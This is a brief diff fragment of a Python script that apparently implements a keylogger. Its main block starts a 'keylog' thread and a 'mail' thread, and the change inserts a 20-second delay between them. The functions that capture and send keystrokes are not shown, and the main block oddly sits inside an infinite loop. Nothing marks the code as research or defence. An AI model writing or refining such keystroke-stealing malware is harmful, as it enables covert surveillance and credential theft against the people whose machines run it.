@@ -56,6 +56,8 @@ while True:
 
     if __name__ == "__main__":
         t1 = threading.Thread(target=keylog)
+        time.sleep(20)
+
         t2 = threading.Thread(target=mail)
         t1.start()
         t2.start()
